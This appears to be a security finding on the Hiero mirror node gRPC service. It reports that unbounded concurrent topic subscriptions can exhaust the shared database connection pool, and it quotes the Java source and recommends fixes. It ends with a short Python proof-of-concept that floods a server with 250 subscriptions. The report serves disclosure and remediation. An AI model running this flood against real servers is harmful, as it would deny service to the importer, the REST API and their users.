### Title
Unbounded Concurrent Subscriptions Enable DB Connection Pool Exhaustion via Historical Message Retrieval

### Summary
`TopicMessageServiceImpl.subscribeTopic()` imposes no global limit on concurrent subscriptions. Each subscription independently spawns a polling `Flux` against the database via `PollingTopicMessageRetriever.retrieve(filter, true)`. An unauthenticated attacker opening many gRPC connections (each with up to 5 calls per the per-connection limit) with `startTime=0` can saturate the HikariCP connection pool, starving all other database consumers including the importer and REST API.

### Finding Description

**Code path:**

`TopicMessageServiceImpl.subscribeTopic()` (lines 59–92) unconditionally constructs a historical retrieval Flux for every subscriber:

```java
Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
``` [1](#0-0) 

The `subscriberCount` field is a Micrometer gauge only — it is never checked against any ceiling before accepting a new subscription: [2](#0-1) 

`PollingTopicMessageRetriever.retrieve()` (lines 45–63) schedules each subscription's polling loop on a shared `Schedulers.boundedElastic()` instance. When `throttled=true`, `numRepeats = Long.MAX_VALUE`, polling every 2 s, page size up to 1 000 rows — each subscription holds a DB connection for the duration of each poll: [3](#0-2) [4](#0-3) 

**Existing check — `maxConcurrentCallsPerConnection = 5`** — limits calls *per TCP connection*, not total connections across the server: [5](#0-4) [6](#0-5) 

An attacker opens `N` TCP connections × 5 calls each = `5N` concurrent subscriptions, all with `startTime=0`, all independently polling the database. There is no IP-level, user-level, or server-level cap on `N`.

**Root cause:** The failed assumption is that `maxConcurrentCallsPerConnection` bounds total server load. It does not — it only bounds per-connection parallelism, leaving total subscription count unbounded.

### Impact Explanation

The gRPC service shares a HikariCP connection pool with the importer and REST API. Default pool size is small (Spring Boot default: 10). With `5N` subscriptions each issuing a DB query every 2 s, the pool is exhausted when `5N` exceeds the pool size. Consequences:
- All other DB consumers (importer ingestion, REST queries) queue or time out waiting for a connection.
- The mirror node stops ingesting new Hedera transactions, causing data staleness for all downstream consumers.
- The `retriever.timeout` of 60 s means each subscription holds pressure for up to 60 s before expiring, but the attacker simply re-subscribes. [7](#0-6) 

### Likelihood Explanation

The gRPC port (5600) is publicly exposed with no authentication required. The attacker needs only a gRPC client (e.g., `grpcurl`, the Hedera SDK, or a trivial script). Opening hundreds of TCP connections is trivial from a single host or a small botnet. The attack is repeatable: subscriptions that time out after 60 s can be immediately re-opened. No special privileges, tokens, or knowledge beyond a valid `topicId` (which is public) are required.

### Recommendation

1. **Enforce a global subscription ceiling**: Check `subscriberCount` against a configurable maximum before accepting a new subscription; return `RESOURCE_EXHAUSTED` if exceeded.
2. **Per-IP / per-connection subscription limit**: Track active subscriptions per remote address and reject excess requests.
3. **Dedicated DB connection pool for the retriever**: Isolate the retriever's pool from the importer pool so exhaustion in one does not starve the other.
4. **Require authentication or API key** for `subscribeTopic` calls to raise the cost of abuse.
5. **Expose `subscriberCount` as an alerting metric with a threshold** (a Prometheus alert already exists for high DB connections but not for subscriber count directly).

### Proof of Concept

```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, consensus_service_pb2, timestamp_pb2, basic_types_pb2

TARGET = "mirror-node-grpc:5600"
TOPIC_NUM = 1234   # any valid topic
NUM_CONNECTIONS = 50
CALLS_PER_CONN = 5  # matches maxConcurrentCallsPerConnection

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=TOPIC_NUM),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
    )
    threads = []
    for _ in range(CALLS_PER_CONN):
        t = threading.Thread(target=lambda: list(stub.subscribeTopic(query)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for w in workers: w.start()
for w in workers: w.join()
# Result: 250 concurrent DB-polling subscriptions; HikariCP pool exhausted;
# importer and REST API connections time out.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L59-63)
```java
    public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
        log.info("Subscribing to topic: {}", filter);
        TopicContext topicContext = new TopicContext(filter);

        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L45-63)
```java
    public Flux<TopicMessage> retrieve(TopicMessageFilter filter, boolean throttled) {
        if (!retrieverProperties.isEnabled()) {
            return Flux.empty();
        }

        PollingContext context = new PollingContext(filter, throttled);
        return Flux.defer(() -> poll(context))
                .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                        .jitter(0.1)
                        .withFixedDelay(context.getFrequency())
                        .withScheduler(scheduler))
                .name(METRIC)
                .tap(Micrometer.observation(observationRegistry))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
                .timeout(retrieverProperties.getTimeout(), scheduler)
                .doOnCancel(context::onComplete)
                .doOnComplete(context::onComplete)
                .doOnNext(context::onNext);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L94-108)
```java
        private PollingContext(TopicMessageFilter filter, boolean throttled) {
            this.filter = filter;
            this.throttled = throttled;

            if (throttled) {
                numRepeats = Long.MAX_VALUE;
                frequency = retrieverProperties.getPollingFrequency();
                maxPageSize = retrieverProperties.getMaxPageSize();
            } else {
                RetrieverProperties.UnthrottledProperties unthrottled = retrieverProperties.getUnthrottled();
                numRepeats = unthrottled.getMaxPolls();
                frequency = unthrottled.getPollingFrequency();
                maxPageSize = unthrottled.getMaxPageSize();
            }
        }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L31-34)
```java
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/RetrieverProperties.java (L27-28)
```java
    @NotNull
    private Duration timeout = Duration.ofSeconds(60L);
```
